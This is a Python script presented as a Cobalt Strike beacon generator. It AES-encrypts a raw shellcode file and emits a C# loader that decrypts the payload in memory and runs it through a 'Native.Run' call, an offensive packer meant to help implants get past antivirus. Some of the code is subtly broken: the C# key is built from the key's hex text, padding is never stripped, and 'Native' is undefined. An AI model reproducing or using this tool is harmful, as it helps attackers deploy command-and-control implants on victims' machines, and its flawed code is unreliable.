import argparse
import hashlib
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

BEACON_TEMPLATE = """public class BeaconLoader {{
	public static void Main() {{
		byte[] sc = new byte[{length}] {{ {shellcode} }};
		{decryptor}
		Native.Run(sc);
	}}
}}"""

def generate_beacon(sc_path, key, output):
	with open(sc_path, "rb") as f:
		shellcode = f.read()
	
	# AES Encrypt
	cipher = AES.new(key, AES.MODE_CBC)
	ct_bytes = cipher.encrypt(pad(shellcode, AES.block_size))
	iv = cipher.iv
	
	# Generate C# loader
	hex_sc = ",".join([f"0x{b:02x}" for b in ct_bytes])
	decryptor = f"""
		byte[] iv = new byte[16] {{ {','.join([f'0x{b:02x}' for b in iv])} }};
		using (Aes aes = Aes.Create()) {{
			aes.Key = Encoding.ASCII.GetBytes("{key.hex()}");
			aes.IV = iv;
			ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
			using (MemoryStream ms = new MemoryStream(sc)) {{
				using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read)) {{
					cs.Read(sc, 0, sc.Length);
				}}
			}}
		}}"""
	
	with open(output, "w") as f:
		f.write(BEACON_TEMPLATE.format(
			length=len(ct_bytes),
			shellcode=hex_sc,
			decryptor=decryptor
		))
	
	print(f"Beacon loader written to {output}")

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Cobalt Strike Beacon Generator")
	parser.add_argument("-f", "--file", required=True, help="Raw shellcode file")
	parser.add_argument("-k", "--key", required=True, help="32-byte AES key (hex)")
	parser.add_argument("-o", "--output", default="beacon.cs", help="Output file")
	
	args = parser.parse_args()
	
	if len(bytes.fromhex(args.key)) != 32:
		print("Invalid key length - must be 32 bytes hex")
		exit(1)
	
	generate_beacon(args.file, bytes.fromhex(args.key), args.output)